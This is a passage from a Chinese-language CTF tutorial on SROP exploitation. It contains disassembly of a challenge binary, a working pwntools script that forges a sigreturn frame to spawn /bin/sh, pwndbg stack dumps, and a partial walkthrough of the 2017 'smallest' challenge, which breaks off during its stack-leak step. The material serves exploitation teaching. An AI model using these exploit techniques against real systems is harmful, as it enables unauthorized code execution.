class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004000E8</span> ; Attributes: bp-based frame</span><br><span class="line">.text:<span class="number">00000000004000E8</span></span><br><span class="line">.text:<span class="number">00000000004000E8</span> ; <span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function">.text:00000000004000E8                 <span class="keyword">public</span> main</span></span><br><span class="line"><span class="function">.text:00000000004000E8 main            proc near               </span>; DATA XREF: LOAD:<span class="number">0000000000400018</span>↑o</span><br><span class="line">.text:<span class="number">00000000004000E8</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004000E8</span>                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004000E9</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004000</span>EC                 mov     rax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000004000F</span>3                 mov     rdi, <span class="number">0</span>          ; error_code</span><br><span class="line">.text:<span class="number">00000000004000F</span>A                 lea     rsi, global_buf ; buf</span><br><span class="line">.text:<span class="number">0000000000400101</span>                 mov     rdx, <span class="number">200</span>h       ; count</span><br><span class="line">.text:<span class="number">0000000000400108</span>                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:<span class="number">000000000040010</span>A                 cmp     rax, <span class="number">0F</span>8h  <span class="meta">#read读入的字符串长度会保存到rax寄存器中，如果字符串的长度小于0xF8，则退出程序</span></span><br><span class="line">.text:<span class="number">0000000000400110</span>                 jb      <span class="keyword">short</span> <span class="built_in">exit</span></span><br><span class="line">.text:<span class="number">0000000000400112</span>                 mov     rdi, <span class="number">0</span>          ; __unused</span><br><span class="line">.text:<span class="number">0000000000400119</span>                 mov     rsp, rsi</span><br><span class="line">.text:<span class="number">000000000040011</span>C                 mov     rax, <span class="number">0F</span>h</span><br><span class="line">.text:<span class="number">0000000000400123</span>                 syscall                 ; LINUX - sys_rt_sigreturn  <span class="meta">#syscall rt_sigreturn</span></span><br><span class="line">.text:<span class="number">0000000000400125</span>                 jmp     <span class="keyword">short</span> <span class="built_in">exit</span></span><br><span class="line">.text:<span class="number">0000000000400125</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400127</span>                 db <span class="number">2</span> dup(<span class="number">90</span>h)</span><br><span class="line">.text:<span class="number">0000000000400129</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400129</span></span><br><span class="line">.text:<span class="number">0000000000400129</span> syscall:                                ; LINUX -</span><br><span class="line">.text:<span class="number">0000000000400129</span>                 syscall</span><br><span class="line">.text:<span class="number">000000000040012B</span>                 jmp     <span class="keyword">short</span> $+<span class="number">2</span></span><br><span class="line">.text:<span class="number">000000000040012</span>D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000040012</span>D</span><br><span class="line">.text:<span class="number">000000000040012</span>D <span class="built_in">exit</span>:                                   ; CODE XREF: main+<span class="number">28</span>↑j</span><br><span class="line">.text:<span class="number">000000000040012</span>D                                         ; main+<span class="number">3</span>D↑j ...</span><br><span class="line">.text:<span class="number">000000000040012</span>D                 mov     rax, <span class="number">3</span>Ch</span><br><span class="line">.text:<span class="number">0000000000400134</span>                 mov     rsi, <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040013B</span>                 syscall                 ; LINUX - sys_exit</span><br><span class="line">.text:<span class="number">000000000040013</span>D                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000400142</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000400143</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400143</span> ; &#125; <span class="comment">// starts at 4000E8</span></span><br><span class="line">.text:<span class="number">0000000000400143</span> main            endp</span><br></pre></td></tr></table></figure><blockquote><p>cmp     rax, 0F8h 中的 0xF8 具有特殊含义，即 ucontext_t 结构体的大小</p></blockquote><p>这个程序的流程很简单，首先调用了通过 syscall 调用 read 函数将我们输入的内容保存到全局变量 global_buf 中【char global_buf<a href="0x200">512</a>】，然后在校验了长度之后 syscall 了 rt_sigreturn；因为这里这里需要使用 pwntools 进行攻击，所以我们先通过这道题的 exp 来了解一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成调试文件</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;pid&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(proc.pidof(sh)[<span class="number">0</span>]))</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">str_bin_sh_offset = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating a custom frame</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = elf.symbols[<span class="string">&#x27;global_buf&#x27;</span>] + str_bin_sh_offset</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.send(<span class="built_in">str</span>(frame).ljust(str_bin_sh_offset, <span class="string">&#x27;a&#x27;</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除调试文件</span></span><br><span class="line">os.system(<span class="string">&quot;rm -f pid&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们在如上代码框中的地方下断点，然后运行调试，可以来到：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622452667957-b01efc5a-85b1-4c93-acaf-f83936901326.png#height=1440&id=aASHi&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-31%2017.17.39.png&originHeight=1440&originWidth=2746&originalType=binary%E2%88%B6=1&size=254410&status=done&style=none&width=2746" alt="截屏2021-05-31 17.17.39.png"><br>之前我们说过，当调用 rt_sigreturn 后会将栈中的内容 pop 到寄存器中，rt_sigreturn 前的 stack 状况如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622452791270-aed290b2-a065-4253-a232-a64e845a4ce4.png#height=708&id=KMAPn&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-31%2017.19.45.png&originHeight=708&originWidth=2750&originalType=binary%E2%88%B6=1&size=167210&status=done&style=none&width=2750" alt="截屏2021-05-31 17.19.45.png"><br>调用 rt_sigreturn 后如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622452845737-41582dfd-9d60-4de2-ab5d-8ee7c1a91109.png#height=1800&id=pZ0Qp&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-31%2017.20.39.png&originHeight=1800&originWidth=2880&originalType=binary%E2%88%B6=1&size=425546&status=done&style=none&width=2880" alt="截屏2021-05-31 17.20.39.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi rsp  <span class="number">0x601000</span> (global_buf) ◂— <span class="number">0x0</span> <span class="comment">#pop</span></span><br><span class="line"><span class="meta">... </span>↓</span><br><span class="line">0d:0068│          <span class="number">0x601068</span> (global_buf+<span class="number">104</span>) —▸ <span class="number">0x601100</span> (global_buf+<span class="number">256</span>) ◂— <span class="number">0x68732f6e69622f</span> /* <span class="string">&#x27;/bin/sh&#x27;</span> */ <span class="comment">#pop rdi</span></span><br><span class="line">0e:0070│          <span class="number">0x601070</span> (global_buf+<span class="number">112</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="meta">... </span>↓</span><br><span class="line"><span class="number">12</span>:0090│          <span class="number">0x601090</span> (global_buf+<span class="number">144</span>) ◂— <span class="number">0x3b</span> /* <span class="string">&#x27;;&#x27;</span> */  <span class="comment">#pop rax</span></span><br><span class="line"><span class="number">13</span>:0098│          <span class="number">0x601098</span> (global_buf+<span class="number">152</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="meta">... </span>↓</span><br><span class="line"><span class="number">15</span>:00a8│          <span class="number">0x6010a8</span> (global_buf+<span class="number">168</span>) —▸ <span class="number">0x400129</span> (main+<span class="number">65</span>) ◂— syscall</span><br><span class="line"><span class="number">16</span>:00b0│          <span class="number">0x6010b0</span> (global_buf+<span class="number">176</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">17</span>:00b8│          <span class="number">0x6010b8</span> (global_buf+<span class="number">184</span>) ◂— <span class="number">0x33</span> /* <span class="string">&#x27;3&#x27;</span> */</span><br><span class="line"><span class="number">18</span>:00c0│          <span class="number">0x6010c0</span> (global_buf+<span class="number">192</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="meta">... </span>↓</span><br><span class="line">1f:00f8│          <span class="number">0x6010f8</span> (global_buf+<span class="number">248</span>) ◂— <span class="string">&#x27;aaaaaaaa/bin/sh&#x27;</span></span><br><span class="line"><span class="number">20</span>:0100│          <span class="number">0x601100</span> (global_buf+<span class="number">256</span>) ◂— <span class="number">0x68732f6e69622f</span> /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line"><span class="number">21</span>:0108│          <span class="number">0x601108</span> (global_buf+<span class="number">264</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="meta">... </span>↓</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>当我们再次单步后就会得到一个 shell；这里介绍一下 pwntools 中 srop 的简单使用方法，大致格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Creating a custom frame</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = elf.symbols[<span class="string">&#x27;global_buf&#x27;</span>] + str_bin_sh_offset</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br></pre></td></tr></table></figure><ul><li>调用 pwnlib 中的 SigreturnFrame 初始化 frame</li><li>然后对 frame 中的一些寄存器进行设置，如 rax、rdi 等，由于这里要获得一个 shell，因此按照下图中设置即可：</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622455069201-ac27ea29-768e-4c3c-8ac8-1f40f035bac6.png#height=541&id=M83Ys&margin=%5Bobject%20Object%5D&name=image.png&originHeight=672&originWidth=691&originalType=binary%E2%88%B6=1&size=159321&status=done&style=none&width=556" alt="image.png"><br>因此在执行 rt_sigreturn 前的 stack 是这样的，这里需要注意的是并不需要布置 rt_sigreturn 在 stack 中，因为我们可以通过在程序的代码段中调用了它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx <span class="number">0x601000</span></span><br><span class="line"><span class="number">0x601000</span> &lt;global_buf&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">#uc_flags#&amp;uc</span></span><br><span class="line"><span class="number">0x601010</span> &lt;global_buf+<span class="number">16</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">#un_stack.ss_sp#uc_stack.ss_flags</span></span><br><span class="line"><span class="number">0x601020</span> &lt;global_buf+<span class="number">32</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">#uc_stack.ss_size#pop r8</span></span><br><span class="line"><span class="number">0x601030</span> &lt;global_buf+<span class="number">48</span>&gt;:<span class="number">0x0000000000000000</span>0x0000000000000000re</span><br><span class="line">    <span class="comment">#pop r9#pop r10</span></span><br><span class="line"><span class="number">0x601040</span> &lt;global_buf+<span class="number">64</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">#pop r11#pop r12</span></span><br><span class="line"><span class="number">0x601050</span> &lt;global_buf+<span class="number">80</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">#pop r13#pop r14</span></span><br><span class="line"><span class="number">0x601060</span> &lt;global_buf+<span class="number">96</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000601100</span></span><br><span class="line">    <span class="comment">#pop r15#pop rdi</span></span><br><span class="line"><span class="number">0x601070</span> &lt;global_buf+<span class="number">112</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">#pop rsi#pop rbp</span></span><br><span class="line"><span class="number">0x601080</span> &lt;global_buf+<span class="number">128</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">#pop rbx#pop rdx</span></span><br><span class="line"><span class="number">0x601090</span> &lt;global_buf+<span class="number">144</span>&gt;:<span class="number">0x000000000000003b</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">#pop rax #pop rcx</span></span><br><span class="line"><span class="number">0x6010a0</span> &lt;global_buf+<span class="number">160</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000400129</span></span><br><span class="line">    <span class="comment">#pop rsp#pop rip--syscall_addr</span></span><br><span class="line"><span class="number">0x6010b0</span> &lt;global_buf+<span class="number">176</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000033</span></span><br><span class="line"><span class="number">0x6010c0</span> &lt;global_buf+<span class="number">192</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6010d0</span> &lt;global_buf+<span class="number">208</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6010e0</span> &lt;global_buf+<span class="number">224</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6010f0</span> &lt;global_buf+<span class="number">240</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x6161616161616161</span></span><br><span class="line">    <span class="comment">#aaaaaaaa</span></span><br><span class="line"><span class="number">0x601100</span> &lt;global_buf+<span class="number">256</span>&gt;:<span class="number">0x0068732f6e69622f</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">#/bin/sh\x00</span></span><br><span class="line"><span class="number">0x601110</span> &lt;global_buf+<span class="number">272</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601120</span> &lt;global_buf+<span class="number">288</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601130</span> &lt;global_buf+<span class="number">304</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601140</span> &lt;global_buf+<span class="number">320</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601150</span> &lt;global_buf+<span class="number">336</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601160</span> &lt;global_buf+<span class="number">352</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601170</span> &lt;global_buf+<span class="number">368</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601180</span> &lt;global_buf+<span class="number">384</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601190</span> &lt;global_buf+<span class="number">400</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6011a0</span> &lt;global_buf+<span class="number">416</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6011b0</span> &lt;global_buf+<span class="number">432</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6011c0</span> &lt;global_buf+<span class="number">448</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6011d0</span> &lt;global_buf+<span class="number">464</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6011e0</span> &lt;global_buf+<span class="number">480</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6011f0</span> &lt;global_buf+<span class="number">496</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601200</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601210</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601220</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>另外这一个例子有意思的一点是地址 0x400119 处的 mov rsp, rsi，其中 rsi 中是 global_buf 的地址，也就是说当我们输入之后程序会将 stack 转移到 global_buf 处，可以联想到之前的栈转移：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004000F</span>A                 lea     rsi, global_buf ; buf</span><br><span class="line">.text:<span class="number">0000000000400101</span>                 mov     rdx, <span class="number">200</span>h       ; count</span><br><span class="line">.text:<span class="number">0000000000400108</span>                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:<span class="number">000000000040010</span>A                 cmp     rax, <span class="number">0F</span>8h</span><br><span class="line">.text:<span class="number">0000000000400110</span>                 jb      <span class="keyword">short</span> <span class="built_in">exit</span></span><br><span class="line">.text:<span class="number">0000000000400112</span>                 mov     rdi, <span class="number">0</span>          ; __unused</span><br><span class="line">.text:<span class="number">0000000000400119</span>                 mov     rsp, rsi     <span class="meta"># lea rsi,global_buf</span></span><br></pre></td></tr></table></figure><p>在调用 rt_sigreturn 后会布置好寄存器，因为 frame.rip=syscall_addr，因此恢复后会直接调用 syscall 执行 execve 得到一个 shell。</p><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题 2"></a>例题 2</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote><p><a href="https://github.com/Reshahar/BlogFile/blob/master/smallest/smallest">https://github.com/Reshahar/BlogFile/blob/master/smallest/smallest</a></p></blockquote><p>这道题来自 2017 年的 360 春秋杯，也是有关 srop 的一道题，文件保护如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622465948601-30850163-1c9f-415b-a453-5cbb9b3e9d0b.png#height=306&id=stoFB&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-31%2020.59.03.png&originHeight=306&originWidth=1454&originalType=binary%E2%88%B6=1&size=51250&status=done&style=none&width=1454" alt="截屏2021-05-31 20.59.03.png"><br>只开启了 nx 保护，放入 IDA 中看一下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622466182637-b619c163-bb1a-43e5-afe0-8aa507885c4d.png#height=586&id=Z9KMl&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-31%2021.02.51.png&originHeight=586&originWidth=1894&originalType=binary%E2%88%B6=1&size=169496&status=done&style=none&width=1894" alt="截屏2021-05-31 21.02.51.png"><br>程序就只有一个 start 函数，挺好：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>; <span class="meta">#read(0,rsp,0x400)</span></span><br></pre></td></tr></table></figure><p>接下来要注意的一点是 start 中的 retn，retn 相当于 pop rip；而在 read 函数中是向栈顶开始读入数据的，因此我们可以利用这一点来控制程序流。<br>由于程序开启了 NX 保护（栈上不可执行），因此我们不能直接写入 shellcode，这里先思考一下想要 getshell 需要什么条件：<br>1、需要知道 syscall 的地址（这个地址程序中已有）<br>2、getshell 时需要调用 execve，这个可以用 syscall（rax=59）进行间接的系统调用，这里就出现了一个问题：我们如何控制 rax？<br>3、由于 read 函数读入字符串后其长度会放入 rax 中，因此我们可以使用这一点进行控制，这里要注意的是 rax 不能清空或改变，即在劫持控制流返回到 retn 时不能劫持到 start 函数开头的 xor rax rax。<br>5、另外，在设置 sigframe 时需要知道 stack 的地址，因此我们需要泄露 stack 地址，这里可以使用 write 进行泄露，但是出现了一个问题，如何调用 write 函数？<br>6、要调用 write 函数这里有两种方式：<br>1）通过调用系统调用 rt_sigreturn 布置寄存器（write：rax==1），通过 syscall 调用 write 函数，但是调用 rt_sigreturn 需要控制 rax==15，而 rax 的控制在这道题中只能是由 read 函数控制。<br>2）通过 read 函数 read 一个字节来控制 rax==1。<br>很明显第一种方式还是绕远了，还是第二种方式简单，但是在此道题目中不太好像到，在这篇文章中的 exp 采用第二种方式。</p><h3 id="编写-exp"><a href="#编写-exp" class="headerlink" title="编写 exp"></a>编写 exp</h3><p>为了保险起见，先向程序输入 3 个 start_addr，防止程序 return 后失去控制流：</p><blockquote><p>在刚开始做这道题的时候可以在 stack 上多布置几个 start_addr，反正也没有什么影响。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">syscall_addr=<span class="number">0x4000BE</span></span><br><span class="line">start_addr=<span class="number">0x4000B0</span></span><br><span class="line">skip_xor_addr=<span class="number">0x4000B3</span></span><br><span class="line"></span><br><span class="line">payload1=p64(start_addr)*<span class="number">3</span></span><br><span class="line">p.sendline(payload1)</span><br></pre></td></tr></table></figure><p>首先我们得泄露 stack 的地址，为之后的 getshell 做准备，这里选择使用 syscall 来调用 write。</p><blockquote><p>注意：在 payload1 中，不能写成：payload1=p64(skip_xor_addr)*3，因为需要清空寄存器 rax<br>当程序第二次开始执行到 syscall 时，这里的 rax 是第一次程序输入时 len(payload1)+0x1==0x18+0x1==0x19，从而会调用其他函数不受我们的控制（这里尽量不要这样做），加一的原因是这里使用的是 sendline 而不是 send。</p></blockquote><p>接下来程序再次会调用 read 函数（read 的系统调用号为 0，正好是 xor rax rax 的结果），因为这里的是 read(0,$rsp,0x400)并且我们还要调用 write 函数，所以这次的 read 可不是乱来的<del>，一鞭，两鞭.mp4</del>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb.attach(p,&#x27;b 0x4000b3&#x27;)</span></span><br><span class="line">p.send(<span class="string">&#x27;\xb3&#x27;</span>)               <span class="comment">#write(rdi==1,$rsi==$rsp,rdx==0x400)</span></span><br></pre></td></tr></table></figure><p>如上所示，由于 read 的长度会到 rax，并且 write 的系统调用号为 1，这里只能选择读入一个字节，但是这个字节也不是随便乱输入的，来看一下此时的 stack 状况：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623064168369-d73eca6e-f16f-4e49-b06a-d2ccaa8266cc.png#height=1800&id=ueac3e2b0&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-07%2019.09.23.png&originHeight=1800&originWidth=2880&originalType=binary%E2%88%B6=1&size=416764&status=done&style=none&width=2880" alt="截屏2021-06-07 19.09.23.png"><br>如上图所示，断点断在了 syscall，这里是向栈地址 0x7fffffffdf98（栈顶 rsp）中写入数据，而栈顶存放的是程序 text 段的地址，利用这一点我们向程序写入单字节’\xb3’，这样可以在下一次执行时跳过 xor rax rax。接下来程序会执行 write 函数，因为由于程序中恰好存在一段 gadget：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rdi，rax</span><br></pre></td></tr></table></figure><p>这使得刚刚 read 后的 rax==1 赋值给了 rdi：rdi 在 64 位传参顺序上起到重要作用（gcc）：当参数少于 7 个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，多余的参数会放入被压入到 stack 中，因此程序会执行：write(1($rdi),$rsp($rsi),0x400($rdx))：</p><blockquote><p>这也就是之前说为什么第二种方式不好想到的原因。</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623065395301-fdce5823-f1ed-4e31-8396-fbf7c30a053c.png#height=1552&id=u8f018f58&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-07%2019.29.50.png&originHeight=1552&originWidth=1454&originalType=binary%E2%88%B6=1&size=220807&status=done&style=none&width=1454" alt="截屏2021-06-07 19.29.50.png"><br>这样就可以泄露出 stack 地址了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leak_stack_addr=u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>]) <span class="comment">#看这里切片的位置</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak_stack_addr)          <span class="comment">#leak_stack_addr==0x7fffffffe20a</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623065711887-44730a70-de50-44cf-acb8-643406383c97.png#height=1800&id=u815b5d7e&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-07%2019.35.08.png&originHeight=1800&originWidth=2880&originalType=binary%E2%88%B6=1&size=545771&status=done&style=none&width=2880" alt="截屏2021-06-07 